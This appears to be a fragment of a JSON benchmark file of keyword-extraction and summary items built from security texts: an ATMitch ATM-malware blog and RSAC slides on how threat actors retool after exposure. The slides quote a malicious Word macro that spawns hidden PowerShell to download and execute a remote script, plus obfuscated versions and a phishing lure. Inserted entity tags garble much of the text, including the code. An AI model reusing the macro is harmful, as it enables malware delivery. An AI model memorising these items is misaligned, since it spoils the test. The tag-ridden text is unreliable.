Carbanak or the GCMAN group . Who manually install it within segregated hosts and write commands directly into the target machine , without any command and control traf\ufb01c . The usage of [ORG] Remote [ORG] Desktop to directly connect to the target machine is also supported by the presence of a prompt window ( Figure [CARDINAL] 4 ) which shows the correct execution of the \ufb01rst stage . Probably the last steps of an attack \ufb02ow involving [ORG] ATMitch are the following:1 . The attacker connects to the [ORG] ATM machine using [ORG] Remote [ORG] Desktop ; [CARDINAL] 2 . The attacker transfers the loader [ORG] EXE and runs it : the prompt window shows if everything went well ; [CARDINAL] 3 . The attacker deletes the initial \ufb01le in order to remove tracks ; [CARDINAL] 4 . The attacker writes commands in the appropriate \ufb01le ; [CARDINAL] 5 . The malware executes the new commands and writes in the log \ufb01le ; [CARDINAL] 6 . The attacker examines the log \ufb01le to know the state of the command execution.url New Evidence Spotted In The Wild \u2013 Yoroi BlogSo , the eventual presence of this malware could be the tip of the iceberg of a more complex and articulated attack perpetrated by advanced cyber - criminals . Indicators of Compromise author = \" ZLAB Yoroi - Cybaze \" last_updated = \" 2019 - 05 - 03 \" tlp = \" white \" category = \" informational\"import \" pe \" $ str1 = { [MONEY] 4A [MONEY] 75 [MONEY] E6 8B [CARDINAL] C7 8B 4D FC } $ str3 = \" MSXFS.dll \" $ str7 = { 40 59 41 50 41 58 49 40 [CARDINAL] 5A } and $ str4 and [MONEY] $ str5 [MONEY] and [MONEY] $ str6 and $ str7 and $ str8 } This blog post was authored by [PERSON] Antonio [PERSON] Farina , [PERSON] Davide [PERSON] Testa , [PERSON] Antonio [PERSON] Pirozzi and [PERSON] Luca [PERSON] Mella of Cybaze- [PRODUCT] Yoroi Z - LABpe.number_of_sections = = [CARDINAL] 4 and pe.number_of_resources = = [MONEY] 3 [MONEY] and [MONEY] $ [MONEY] str1 and $ str2 or $ str3url", "generated_text": "the ATMitch malware; ATMitch; 2017; Ukrainian Bank; cybercriminals; ATMs; PE32; tests; the loader; data; the payload; its own memory; SetThreadContext; the memory; SetThreadContext; the process; persistence; the loader; the ATM; a popup window; the injection phases; a PE32 x86 file; tester.exe; Sha256; the ATMitch attack operation; Kaspersky Lab; the malware; its initial preparation.", "ref_text": "<START-1>A new sample of ATM malware ATMitch was discovered in the wild, possibly active since 2017. ATMitch was originally revealed by Kaspersky after compromise of a Russian bank. It is manually installed on ATMs after network compromise. The sample has a custom loader that injects the payload DLL into the fwmain32 process of Wincor ATM software. Once the payload is injected into the \"fwmain\" process, it shows a popup window reporting the outcome of the injection phases. The final steps of an attack involving ATMitch involve connecting to the ATM machine using Remote Desktop, transferring the loader EXE, running it, deleting the initial file to remove tracks, writing commands in the appropriate file, executing new commands, and writing them in the log file. The malware can retrieve info from the ATM and dispense money usingWFSDISPENSE command. The discovery suggests ATMitch is still actively used by sophisticated attackers like Carbanak targeting banks and ATMs. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.49836065573770494, "gpt3/lexical/rouge_rouge2": 0.16501650165016504, "gpt3/lexical/rouge_rougeL": 0.24262295081967214, "gpt3/lexical/rouge_rougeLsum": 0.24262295081967214, "gpt3_generated_text": ["In April, a new malware sample was discovered in the wild, potentially targeting the banking sector and believed to be related to the APT group that compromised a Russian bank in 2017. The sample, named \"tester.exe,\" is a custom loader for the actual malicious payload. It was compiled on October 8, 2017, which aligns with the timeframe of the ATMitch attack operation disclosed by Kaspersky Lab. When executed, the malware creates a new folder on the C:\\intel directory and scans running processes for the presence of \"fwmain32.exe,\" a process associated with Wincor Nixdorf International GmbH, a major vendor of ATM hardware. If found, the loader injects the payload DLL into the fwmain32.exe process using the SetThreadContext injection technique. The injected DLL has a dependency on \"msxfs.dll,\" which provides access to the EXtension for Financial Service (XFS) API. The payload then gains persistence and starts its malicious execution."]}, {"split_name": "test", "sample_id": "test_60", "prompt_text": "Extract the keywords: SESSION ID : TTA1 - F04Hide and Seek : How Threat Actors Respond in [WORK_OF_ART] the [WORK_OF_ART] Face [WORK_OF_ART] of [WORK_OF_ART] Public [WORK_OF_ART] ExposureMarcin [WORK_OF_ART] Siedlarz [WORK_OF_ART] Senior [WORK_OF_ART] Threat [WORK_OF_ART] Intelligence [WORK_OF_ART] Analyst [WORK_OF_ART] Senior [WORK_OF_ART] Threat Intelligence Analyst [ORG] FireEye , Inc.#RSACShow of Hands#RSACHave you ever been directly involved in a publicwhite paper or blog about a threat actor?Show of Hands#RSACDo you use vendor white papers or blogs to develop better situational awareness about threats to your organization?Glossary of Terms#RSAC\u201cAPT \u201d Groups : [ORG] Groups conducting network operations on behalf of a nation state . Includes cyber espionage and network attack activity . \u201cFIN \u201d Groups : Well organized , capable intrusion teams that conduct intrusions for financial gain . Seek to steal information that can be monetized . TTPs : \u201c Tactics , [WORK_OF_ART] Techniques [WORK_OF_ART] and [WORK_OF_ART] Procedures \u201d \u2013 the \u201c toolkit \u201d and methods threat actors use to achieve their objectives . Photo : @kecia85 on Flickr4Research Question#RSACHow do threat groups respond when their operations are exposed in public reporting?Bottom Line Up Front#RSACPublic exposure is a major trigger for behavioral changeApply#RSACBy the end of this presentation you \u2019ll be able to \u2026 Evaluate the impact of a blog or white paper on an adversary \u2019s future operationsRoad Map#RSACIntroductionKey [PRODUCT] ConceptsCase StudiesCall to [ORG] ActionPhoto : [PERSON] Ryan [PERSON] Cadby @ryancadby on FlickrA Tug of [ORG] War#RSACIntelligence collectionvs . Computer networkdefensePhoto : [PERSON] William [PERSON] James ca . [DATE] 1920 City of Toronto ArchivesWhy Does Exposure Matter?#RSACPublic spotlight creates a flashpoint of awareness of a group \u2019s ops , TTPS Security vendors sprint to detect publicized activityNet defenders more likely to hunt in their networks for evidence of a group , employ new IOCs or detection methodsExposure triggers public awareness and increases threat groups \u2019 risk ofdetection / discovery . Why Does Exposure Matter \u2013 Big Picture#RSACWhat ethical boundaries and obligations do security researchers face?Are we cultivating better OPSEC in the actors we expose?What is the best way to share?Mission vs. [ORG] MarketingKey [ORG] ConceptThreat [ORG] Shifting#RSAC\u201cResponse from adversaries to perceived safeguards and/or countermeasures , in which the adversaries change some characteristic of their [ operations ] in order to avoid and/or overcome those safeguards / countermeasures \u201d \u2014 NIST Special Publication 800 - 30 : Guide for Conducting Risk AssessmentsThreat Shifting in Nature#RSACEvolution to reduce the risk of predationMimickry : Heliconius butterflies mimic wing coloration patterns to signal toxicity to predatorsThreat Shifting in Information Security#RSACExamples of Threat ShiftingEvolution of banking [NORP] Trojans from clumsy keyloggers to highly flexible webinject offeringsAdoption of [ORG] Powershell and [ORG] WMI for lateral movement and backdoor functionalityFour [WORK_OF_ART] Domains [WORK_OF_ART] for [WORK_OF_ART] Adaptation#RSACThreat shifting occurs across [CARDINAL] four domains : [ORG] TIMINGTARGETSRESOURCESPLANNING [ORG] & METHODSImage Sources : [ORG] Public [ORG] Domain [ORG] @o5com [ORG] on [ORG] Flickr ; [PERSON] Andrew [PERSON] Magill [PERSON] @amagill on [ORG] FlickrTrigger [ORG] Points for Threat Shifting#RSACExposureRemediationDetectionA caveat \u2026 #RSACOur observations are based on [ORG] FireEye \u2019s visibility . Research Question#RSACHow do threat groups respond when their operations are exposed in public reporting?#RSACThey know . Threat groups are often keenly aware of research & reporting on their operations . They know.#RSACAPT28 signals they are aware of security researchers \u2019 blogs ( and none too pleased \u2026 )July [DATE] 2015 blog on [GPE] APT28 spear phishing campaign that leveraged a Java [CARDINAL] zero - dayWithin [DATE] 1 [DATE] day , APT28 updated [ORG] DNS info for domain hosting exploit to point to [ORG] TrendMicro \u2019s IP space * APT28 aka [PERSON] Pawn [PERSON] Storm , Sednit , Sofacy , [PERSON] Fancy [PERSON] Bear , StrontiumKeenly aware of research and reporting#RSACThreat Actors Read the News , Too . APT1 : Major interruption to APT1 \u2019s operationsCareto / Mask : \u201c \u2026 after the post was published , the [PERSON] Mask operators shut everything down within [CARDINAL] about [CARDINAL] four hours\u201dAPT3 aka UPS : Changed tactics on the fly in direct response to [ORG] FireEye blogKeen awareness : [ORG] APT29APT29 aka the Dukes , [ORG] CozyDuke , [PERSON] TEMP.Monkey , [PERSON] Cozy Bear#RSACSecurity researchers likely analyzingsamples ; probing staging serverJuly 7 , [DATE] 2015 Phish sent : [ORG] National [ORG] Endowment [ORG] for [ORG] Democracy lureJuly 3 , 2015 Downloader compiledJuly 8 , [DATE] 2015 Phish payload submitted to [DATE] VTJuly [DATE] 14 , [DATE] 2015 Payload files deleted from compromised serverJuly [CARDINAL] 14 , 2015Not only are they keenly aware \u2026 #RSACSome actors actively seek to [ORG] MANIPULATE [ORG] public [ORG] perception.#RSACPublic reports can be deeply disruptive to athreat group \u2019s operations \u2026 or not . Incentives matter . FIN4 : Cybercriminals Playing the [ORG] Market#RSACFIN4 : Targeted 100 + organizations in seek of information that would convey a stock trading advantageCan\u2019t Take the Heat : FIN4 Halts Operations#RSACFIN4 REPORT PUBLISHED [DATE] Dec. [DATE] 1 , [CARDINAL] 2014Summer 2014 \u2022 \u2022Incident response at victims Similar TTPS and targetsSummer \u2013 Fall 2014 \u2022FIN4 actively targeting new victims\u2022 Adds [CARDINAL] dozens of new targets inweek prior to public reportFIN4 DISCONTINUES OPS [DATE] Dec. [DATE] 2014 \u2022FIN4 appears to shut down entirelyAPT28 : Collecting Intelligence for a [ORG] State Sponsor#RSACAPT28 aka [PERSON] Pawn [PERSON] Storm , Sednit , Sofacy , [PERSON] Fancy [PERSON] Bear , StrontiumAPT28 : global intelligence collection operation targeting information tightly aligned w/ [NORP] Russian government interests . APT28 : Keep on [ORG] Truckin\u2019APT28 aka [PERSON] Pawn [PERSON] Storm , Sednit , Sofacy , [PERSON] Fancy [PERSON] Bear , [ORG] Strontium#RSAC20+Reports examining [GPE] APT28 TTPSOct . [DATE] 2014 \u2013 [DATE] Oct. [DATE] 2015Timeline of APT28 ExposuresPublic report examining APT28 \u2019s [PERSON] operationsAPT28 : Keep on [ORG] Truckin\u2019APT28 aka [PERSON] Pawn [PERSON] Storm , Sednit , Sofacy , [PERSON] Fancy [PERSON] Bear , Strontium#RSACIn spite of repeated exposure [GPE] APT28 has sustained operationsTimeline of [GPE] APT28 ExposuresPublic report examining APT28 \u2019s [PERSON] operationsAPT28 : Keep on [ORG] Truckin\u2019APT28 aka [PERSON] Pawn [PERSON] Storm , Sednit , Sofacy , [PERSON] Fancy [PERSON] Bear , Strontium#RSACDecember 2014 identifiers\u2022March [DATE] 2015 \u2022Password reset theme employing bit.ly Links configured to look like legit Google URLs\u2022August 2015 \u2022Abuse of [ORG] Yahoo [ORG] OAuth service to enable phishing Phishing e - mails point to legit Yahoo URL\u2022Timeline of APT28 [ORG] ExposuresNew [ORG] Phishing [ORG] Tactic [ORG] ObservedIncentives [ORG] Matter.#RSACOpportunisticvs . [PERSON] Requirements [PERSON] Driven#RSACPublic reports are a commontrigger for retoolingAPT12 : \u201c [PERSON] Darwin \u2019s Favorite APT Group\u201dAPT12 aka [ORG] DNSCALC , [ORG] IXESHE , [ORG] CALC [ORG] Team , [ORG] DynCalc , Numbered Panda#RSACCountries TargetedAustraliaNetherlandsEgyptTaiwanIndiaTunisiaJapanUnited [ORG] StatesSingaporeIndustries [ORG] TargetedAerospace [ORG] & [ORG] DefenseBusiness [ORG] & [ORG] Professional [ORG] ServicesConstruction [ORG] & [ORG] EngineeringEducationEnergyFinancial [ORG] Services [ORG] & [ORG] InsuranceGovernment [ORG] Organizations [ORG] International [ORG] OrganizationsHealthcare [ORG] & [ORG] PharmaceuticalsHigh [ORG] Tech [ORG] & [ORG] ITMedia and [ORG] Entertainment [ORG] Retail [ORG] and [ORG] Consumer [ORG] GoodsTelecommunicationsTransportationAPT12Active since at least 2009.Conducts cyber espionage for the purposes of intelligence collection . APT12 : \u201c [PERSON] Darwin \u2019s Favorite APT Group\u201dAPT12 aka [ORG] DNSCALC , [ORG] IXESHE , [ORG] CALC [ORG] Team , [ORG] DynCalc , [ORG] Numbered Panda#RSAC\u2022\u2022Jan . [DATE] 31 , [DATE] 2013 : [ORG] New [ORG] York [ORG] Times exposes APT12 intrusion in their environment- Exposure triggered brief pause in activity andimmediate changes in TTPsJune 6 , [DATE] 2014 : APT12 \u2019s RIPTIDE aka [PERSON] Etumbot backdoor is the subject of a comprehensive white paper- [PERSON] White paper triggered rapid shift in toolset . [ORG] New [ORG] York [ORG] Times \u2014 [DATE] Jan. [DATE] 31 , 2013APT12 Retools After RIPTIDE White PaperAPT12 aka [ORG] DNSCALC , [ORG] IXESHE , [ORG] CALC [ORG] Team , [ORG] DynCalc , [ORG] Numbered Panda#RSACJune [DATE] 2014 [ORG] Arbor [ORG] Networks [ORG] Paper [ORG] on [ORG] RIPTIDE aka EtumbotRIPTIDE aka Etumbot , ShocoHIGHTIDE4/1/1210/18/125/6/1311/22/136/10/1412/27/147/15/151/31/16APT12 Retools After RIPTIDE White PaperAPT12 aka [ORG] DNSCALC , [ORG] IXESHE , [ORG] CALC [ORG] Team , [ORG] DynCalc , [ORG] Numbered Panda#RSACJune [DATE] 2014 [ORG] Arbor [ORG] Networks [ORG] Paper [ORG] on [ORG] RIPTIDE aka EtumbotRIPTIDE aka Etumbot , ShocoWATERSPOUTHIGHTIDE4/1/1210/18/125/6/1311/22/136/10/1412/27/147/15/151/31/16Evolution of APT12 \u2019s malware encryptionAPT12 aka [ORG] DNSCALC , [ORG] IXESHE , [ORG] CALC [ORG] Team , [ORG] DynCalc , [ORG] Numbered Panda#RSACRIPTIDE GET requestEvolution of APT12 \u2019s malware encryptionAPT12 aka [ORG] DNSCALC , [ORG] IXESHE , [ORG] CALC [ORG] Team , [ORG] DynCalc , Numbered Panda#RSACHIGHTIDE GET requestEvolution of APT12 \u2019s malware encryptionAPT12 aka [ORG] DNSCALC , [ORG] IXESHE , [ORG] CALC [ORG] Team , [ORG] DynCalc , [ORG] Numbered Panda#RSACRIPTIDE traffic encryption : [CARDINAL] BASE64RC4Evolution of APT12 \u2019s malware encryptionAPT12 aka [ORG] DNSCALC , [ORG] IXESHE , [ORG] CALC [ORG] Team , [ORG] DynCalc , [ORG] Numbered Panda#RSACHIGHTIDE traffic encryption : BASE64XOR + 12bytes \u201c salt\u201dRSA encryptedRC4Operation [ORG] SMN \u2014 APT17 Interdiction#RSACAPT17 aka [ORG] Axiom , [ORG] DeputyDog , [ORG] Tailgater [ORG] Team , [ORG] Hidden [ORG] Lynx , Voho , Group72 , AuroraPandaCountries TargetedGermanyTaiwanJapanUnited [ORG] KingdomSouth [ORG] KoreaUnited [ORG] StatesIndustries [ORG] TargetedAerospace [ORG] & [ORG] DefenseBusiness [ORG] & [ORG] Professional [ORG] ServicesConstruction [ORG] & [ORG] EngineeringEnergyFinancial [ORG] Services [ORG] & [ORG] InsuranceGovernment [ORG] Organizations [ORG] International [ORG] OrganizationsHigh [ORG] Tech [ORG] & [ORG] ITMedia and [ORG] Entertainment [ORG] Retail [ORG] & [ORG] Consumer [ORG] GoodsTelecommunicationsTransportationAPT17Conducts cyber espionage for thepurposes of intellectual property theft . Frequently targets Japaneseorganizations . Operation [NORP] SMN \u2014 [GPE] APT17 Interdiction#RSACAPT17 aka [ORG] Axiom , [ORG] DeputyDog , [ORG] Tailgater [ORG] Team , [ORG] Hidden [ORG] Lynx , Voho , Group72 , AuroraPandaMore than an exposure effort:- Coalition sought to eradicate specific \u2018 high value \u2019 tools andmake it more expensive for [GPE] APT17 to operate- Coordinated action was accompanied by public materials toaid detection and educate victimsOperation [ORG] SMN coalition went into the effort with eyes wide open:- Acknowledged from outset that [GPE] APT17 was skilled , equippedto adapt and would very likely retool#RSACOperation [ORG] SMN sought to KNOCK OUT [DATE] APT17 \u2019S high value tools such as HIKITBefore and After Operation SMN#RSACAPT17 aka [ORG] Axiom , [ORG] DeputyDog , [ORG] Tailgater [ORG] Team , [ORG] Hidden [ORG] Lynx , Voho , Group72 , [DATE] AuroraPandaHIKITAugust [DATE] 2014 Last observed [ORG] HIKIT compile dateLegendTimespan [ORG] Observed ( based on malware sample compile times)18 - Oct-126 - May-1322 - Nov-1310 - Jun-1427 - Dec-1415 - Jul-1531 - Jan-16Before and After Operation SMN#RSACAPT17 aka [ORG] Axiom , [ORG] DeputyDog , [ORG] Tailgater [ORG] Team , [ORG] Hidden [ORG] Lynx , Voho , Group72 , AuroraPandaHIKITSeptember [CARDINAL] 28 , [DATE] 2014 Last observed sample created on victim hostLegendTimespan [ORG] ObservedFile created on victim host18 - Oct-126 - May-1322 - Nov-1310 - Jun-1427 - Dec-1415 - Jul-1531 - Jan-16Before and After Operation SMN#RSACAPT17 aka [ORG] Axiom , [ORG] DeputyDog , [ORG] Tailgater [ORG] Team , [ORG] Hidden [ORG] Lynx , Voho , Group72 , [DATE] AuroraPandaOctober [DATE] 2014 Operation SMN Public ActionHIKITSeptember 28 , 2014 Last observed sample created on victim hostzLegendTimespan [ORG] ObservedFile created on victim host18 - Oct-126 - May-1322 - Nov-1310 - Jun-1427 - Dec-1415 - Jul-1531 - Jan-16Before and After Operation SMN#RSACOctober [DATE] 2014 Operation SMN Public ActionHIKIT18 - Oct-126 - May-1322 - Nov-1310 - Jun-1427 - Dec-1415 - Jul-1531 - Jan-16zBefore and After Operation SMN#RSACOctober [DATE] 2014 [ORG] Operation [ORG] SMN [ORG] Public ActionRAYGUNHIKITMUGBRAIN18 - Oct-126 - May-1322 - Nov-1310 - Jun-1427 - Dec-1415 - Jul-1531 - Jan-16zBefore [ORG] and [ORG] After [ORG] Operation SMN#RSACOctober [DATE] 2014 [ORG] Operation [ORG] SMN [ORG] Public [ORG] ActionSCARYMOVIEHIGHNOTEMUGBRAINSIDEWINDERHIGHNOON aka [PERSON] WinntiRAYGUNHIKITBLACKCOFFEE aka [PERSON] ZoxPNGLONEAGENT aka FexelPHOTO aka [ORG] DerusbiSOGU aka PlugX , Kabas18 - Oct-126 - May-1322 - Nov-1310 - Jun-1427 - Dec-1415 - Jul-1531 - Jan-16zBefore and After Operation SMNAPT17 aka [ORG] Axiom , [ORG] DeputyDog , [ORG] Tailgater [ORG] Team , [ORG] Hidden [ORG] Lynx , Voho , Group72 , AuroraPanda#RSACOctober 2014 [DATE] October [DATE] 2014 [ORG] Operation [ORG] SMN [ORG] Public [ORG] Action [ORG] Operation [ORG] SMN [ORG] Public [ORG] ActionLONEAGENT aka [PERSON] FexelLegendTimespan Observedz10/18/12(based on malware sample compile times)5/6/1311/22/136/10/1412/27/147/15/151/31/16Before and After Operation SMNAPT17 aka [ORG] Axiom , [ORG] DeputyDog , [ORG] Tailgater [ORG] Team , [ORG] Hidden [ORG] Lynx , Voho , Group72 , AuroraPanda#RSACOctober [DATE] 2014 Operation SMN Public ActionFebruary 2015 APT17 begins consistently armorizing [PERSON] LONEAGENT [PERSON] samplesLONEAGENT aka FexelLegend10/18/12Timespan Observed LONEAGENT w/ RC4 Crypto5/6/1311/22/136/10/1412/27/147/15/151/31/16zBefore and After Operation SMNAPT17 aka [ORG] Axiom , [ORG] DeputyDog , [ORG] Tailgater [ORG] Team , [ORG] Hidden [ORG] Lynx , Voho , [PERSON] Group72 , [PERSON] AuroraPanda#RSACQuick retooling and adaptation#RSACSuspected [ORG] FIN threat actor rapidly changes TTPs after public reporting : \u201c PUNCHBUGGY\u201dWhat is PUNCHBUGGY#RSACTailored phishing messages#RSACTimeline#RSAC8 - 9 [DATE] March [DATE] 2016 : McAfee , [ORG] Bromium [ORG] blogs7/15/159/3/1510/23/1512/12/151/31/163/21/165/10/166/29/168/18/16McAfee Labs \u2019 report#RSACSource : url#RSACSource : url cont\u2019d#RSAC8 - 9 [DATE] March [DATE] 2016 : McAfee , [ORG] Bromium blogs10 [DATE] March [DATE] 2016 : TTPs shift11 [DATE] March [DATE] 2016 : PaloAltoNetwork \u2019s report7/15/159/3/1510/23/1512/12/151/31/163/21/165/10/166/29/168/18/16Macro downloader changed from this:#RSACAttribute VB_Name = \" NewMacros \" [WORK_OF_ART] Sub AutoOpen()Const HIDDEN_WINDOW = 0 Set objWMIService = [ORG] GetObject(\"winmgmts:\\\\ \" [ORG] & [ORG] strComputer [ORG] & \" \\root\\cimv2\")Set objStartup = objWMIService . Get(\"Win32_ProcessStartup \" ) Set objConfig = objStartup . SpawnInstance _ objConfig . ShowWindow = HIDDEN_WINDOW Set objProcess = [ORG] GetObject(\"winmgmts:\\\\ \" [ORG] & [ORG] strComputer [ORG] & \" \\root\\cimv2 : Win32_Process \" ) objProcess . Create \" power \" & \" shell \" & \" .exe -ExecutionPolicy [PERSON] Bypass -WindowStyle Hidden -noprofile -noexit -c if ( [ IntPtr]::size -eq 4 ) { ( new - object Net . WebClient ) . \" & [ORG] x1 [ORG] & [ORG] x2 [ORG] & \" ( ' url | iex } else { ( new - object Net . WebClient ) . \" & [ORG] x1 [ORG] & [ORG] x2 [ORG] & \" ( ' url | iex } \" , [ORG] Null , [ORG] objConfig , intProcessID End SubTo this:#RSACPrivate Const WCmOFNHznPSAokywsh As String = \" xQFPBbfIMjTtUhckEoudAVzYvgisNaHXDOSZLeq \u201d [ORG] Private [ORG] Const AFPsxGjINKYLfVUvui As String = \" KpvTdPCRFgoyJOucw \u201d Private Const NvqAHROKeCVtWf As String = \" lDtgNZkfMizcGIsBR \u201d Private Const pcAFWyJEkv As String = \" zkCLKVfGXWuBFlTMwOURYnIbhveNP \u201d Private Const LNkFVBSQeDvznpmH As String = \" XxqdyculNPvJrEDCAGhYUIbVmjMkRQ \u201d Private Const ZoXxOaDMdzsglBV As String = \" cIbXZqiBdKuSgETwHGoCWDefPhYpvALlzVrjysUmxNaQ \u201d [ORG] Private [ORG] Const gyMRPIeKLJnsHuatlpc As String = \" QOVAFGiBvIexypDbloSqcRhLszaEnZjWTMKPUYgrdwuHfJ \u201d Private Const DKjYtIzTqvpuXPw As String = \" mJbxngCeZtlksVEpiKHNBv \u201d Private Const ULMYzFkgZpdqs As String = \" NlpDMBhuRLOJvySeGzjsgwIVtfiZCdnqA \u201d Private Const KbumUjRiJXrx As String = \" jlbmaHhfdstKUgkDBC \u201d Private Const LWSjdoRABU As String = \" sEAeZptMyInzPVHjJoK \u201d Private Const gnAcwqCyivtBsfVhm As String = \" mOQsBrgUpENXMSTjhFDbCIWlk \u201d Private Const YQbAcyLxgojHlrpUG As String = \" HtCKmkRQTpv \u201d Private Const TJWFglmHsLUDpVorbyB As String = \" BiHwTdnKbGvVkrfMJIFouXUNqCmlaeL \u201d And so on \u2026 [PERSON] Slight change of the lure#RSACTimeline con\u2019t#RSAC8 - 9 [DATE] March [DATE] 2016 : McAfee , [ORG] Bromium [ORG] blogs2 [DATE] May [DATE] 2016 : TTPs shift7/15/159/3/1510/23/1512/12/151/31/163/21/165/10/166/29/168/18/16Adapting macro lure#RSACFurther macro [ORG] obfuscation#RSACPrivate [ORG] Function ieviAaZ296N3Ve ( ) As String ieviAaZ296N3Ve = cin1A9DKSxWMDQT(\"taoeptIxicetj3td.rtBD.edfhIQ2ma / xse3 / a / ar0 / mc : DMh \" , [DATE] 1575 ) End Function Private Function Z2rLBQGmQVZx ( ) As String Z2rLBQGmQVZx = cin1A9DKSxWMDQT(\"t./d / caef : tFEBxx4aem.ae / phkI84t6imodcr / tHyPs7 \" , [DATE] 1455 ) End Function Private Function dMz9cDR9IkYHKjS ( ) As String dMz9cDR9IkYHKjS = cin1A9DKSxWMDQT(\"}|3Mx ore)VDi'WY H3B \" , [CARDINAL] 184 ) End Function Public Function DA8Ystq ( ) As String DA8Ystq = J8eLZoOB6mi9 M & ORs8gh & ieviAaZ296N3Ve [ORG] & [ORG] kn8hbEV3 [ORG] & [ORG] Z2rLBQGmQVZx [ORG] & [ORG] dMz9cDR9IkYHKjS [ORG] End [ORG] Function [ORG] Private [ORG] Function J8eLZoOB6mi9 M ( ) As String J8eLZoOB6mi9 M = cin1A9DKSxWMDQT ( \" xnefp - eietoi aBcooux elsw4kZcte - loo dHlSdWsp iPicEe.eroczz - io irnnd ywn - syylnte - xlhepwXZ \" , [ORG] Private [ORG] Function [ORG] kn8hbEV3 ( ) As String kn8hbEV3 = cin1A9DKSxWMDQT(\"'roDeeNjee } Ci(tl.iW bns |zDgSn)l.to(lx AindwtCtc-{ee)IHiaonbeew i'WV \" , [CARDINAL] 4214 ) End Function And so on \u2026 [PERSON] Adapting [PERSON] Tailored Email Example#RSACto : < branch i d # > store subject : < branch location > < org name > Hi , As discussed on the phone , I 'm sending you the guest list and timing details with pre - order uploaded on dropbox . Would you be so kind as to review this request and let me know about your availability ? hxxps://www.dropbox[.]com / s / XXXX / Reservation%20details% 20at%20 < org name>.doc?dl=1Would you be so kind as to review this request and let me know about your availability?Thanks ! Michael.#RSACAs part of retooling , threat actors can turn on a dimeAPT3 Modifies Attack Following Release of Operation [PERSON] Clandestine [PERSON] Wolf#RSACAPT3 aka [ORG] UPS , [ORG] Gothic [ORG] PandaClandestine Wolf Blog [DATE] June 23 , [DATE] 2015One [DATE] Day LaterAPT3 continued , with modifications : Created new phishing emailsRemoved mechanism to profile end user systemsModified filenames of files used for exploitationAltered shellcodeCompiled new payloads with updated [CARDINAL] C2 ; increased obfuscation#RSACThe path of least resistance rules . \u201cIf it ai n\u2019t broke , do n\u2019t fix it . \u201dAPT17 : Hiding in Plain Sight Redux#RSACAPT17 aka [ORG] Axiom , [ORG] DeputyDog , [ORG] Tailgater [ORG] Team , [ORG] Hidden [ORG] Lynx , Voho , Group72 , [DATE] AuroraPandaMay [DATE] 2015FireEye and [ORG] Microsoft coordinate takedown of [ORG] BLACKCOFFEE [ORG] Technet abuse ; Report technique publicly\u201c@MICR0S0FT \u201d < encoded C2 location > \u201c [WORK_OF_ART] C0RP0RATI0N\u201dC2 LocationAPT17 : Hiding in Plain Sight Redux#RSACAPT17 aka [ORG] Axiom , [ORG] DeputyDog , [ORG] Tailgater [ORG] Team , [ORG] Hidden [ORG] Lynx , Voho , Group72 , [DATE] AuroraPandaAugust [DATE] 2015 : Modified BLACKCOFFEE varianttargeting [ORG] JP organizations\u201clOve yOu [CARDINAL] 4 eveR \" < encoded C2 location > \" Reve 4 uOy evOl\u201dC2 Location#RSACWhen needed , threat actors will add more resources to get the job doneAPT28 : Keep on [ORG] Truckin\u2019APT28 aka [PERSON] Pawn [PERSON] Storm , Sednit , Sofacy , [PERSON] Fancy [PERSON] Bear , [ORG] Strontium#RSAC20+Reports examining [GPE] APT28 TTPSOct . [DATE] 2014 \u2013 [DATE] Oct. [DATE] 2015Timeline of APT28 ExposuresPublic report examining APT28 \u2019s [PERSON] operationsAPT28 : Keep on [ORG] Truckin\u2019APT28 aka [PERSON] Pawn [PERSON] Storm , Sednit , Sofacy , [PERSON] Fancy [PERSON] Bear , [DATE] Strontium#RSACApril [DATE] 2015 \u2022 CVE-2015 - 1701 Windows local privs . escalation vulnApril [DATE] 2015 \u2022CVE-2015 - 3043 Adobe Flash [CARDINAL] Zero - DayJuly [CARDINAL] 2015 \u2022CVE-2015 - [DATE] 2424 [ORG] Microsoft [ORG] Office Zero - DayJuly 2015 \u2022CVE-2015 - 2590 Java [CARDINAL] Zero - DayOctober 2015 \u2022CVE-2015 - 7645 Adobe Flash [PERSON] Zero [PERSON] DayTimeline of APT28 ExposuresZero DayAPT28 : Keep on [ORG] Truckin\u2019APT28 aka [PERSON] Pawn [PERSON] Storm , Sednit , Sofacy , [PERSON] Fancy [PERSON] Bear , [GPE] Strontium#RSACAPT28 continues to develop new tools\u2022 [DATE] March [DATE] 2015 : new variantof CORESHELL\u2022 [DATE] Dec. [DATE] 2015 : [ORG] New [ORG] Backdoor [DATE] Jan. [DATE] 2016 : New Launcher \u2022Image Source : Wellness GM @wellness_photos on Flickr#RSACIn Summary \u2026 Hide and Seek : How Threat Actors Respond in [WORK_OF_ART] the [WORK_OF_ART] Face [WORK_OF_ART] of [WORK_OF_ART] Public Exposure#RSACKey [ORG] TakeawaysThreat actors are often keenly aware of reporting on their operationsExposure can disrupt an actor \u2019s operations \u2026 if the incentives are right . Public reporting triggers retoolingActors may abandon tools or develop new ones . The path of least resistance is often king . Sometimes , actors solve the problem by adding resources : time , money , tool developmentHide and Seek : How Threat Actors Respond in [WORK_OF_ART] the [WORK_OF_ART] Face [WORK_OF_ART] of [WORK_OF_ART] Public [WORK_OF_ART] Exposure#RSACExposure is a balancing actSecurity researchers must continually weigh the benefits of public awareness against possible disruptions to detection and loss of visibility . When executed well , exposure benefits victims , network defenders and the security community at large . Questions to Ask#RSACWhen evaluating whether exposing an adversary is the best course of action : When evaluating how a threat actor will likely respond when their operations are exposed:- What impact do we want to have on the adversary?- How adaptive and capable is the group?- How will exposure help / hurt victims and likely [PERSON] futuretargets?- [PERSON] Groups with a flat toolset and low adaptivecapability are more likely to be disrupted- How will exposure impact \u2018 big picture \u2019 concerns like- How determined are they to maintain access tolaw enforcement efforts?specific targets?- Will exposure degrade our ability to detect andrespond to future activity?- What shifts to targeting , timing , resourcing [ORG] & [ORG] TTPsis the actor likely to make?#RSACThank you", "generated_text": "RSAC; Exposure; Public Awareness; Threat Actors; ATT&CK; research; a white paper; an adversary; a national state; TTP; tactics; techniques; procedures; IP; analysis; tactics; techniques; Procedures; remote access; detection; MB; an analysis; the nature; Threat Shifting; applications; EM; the conference; the exposure; exposure; research; attribution; attribution; checks; attribution.", "ref_text": "<START-1>This presentation examines how threat actors respond when their operations are publicly exposed through white papers or blogs. It finds that public reporting often triggers changes in the threat actors' tactics, techniques and procedures (TTPs) as they seek to evade detection and continue operations. The presentation analyzes case studies of various groups, including nation-state actors like APT28 and APT17, and financially-motivated actors like FIN4. It finds that the threat actors are usually aware of public reporting about their activities, and exposure can disrupt operations, especially for financial groups. However, espionage groups often continue unfazed. When operations are exposed, threat actors frequently retool by abandoning compromised tools, developing new ones, and shifting tactics. But they tend to stick with the easiest path 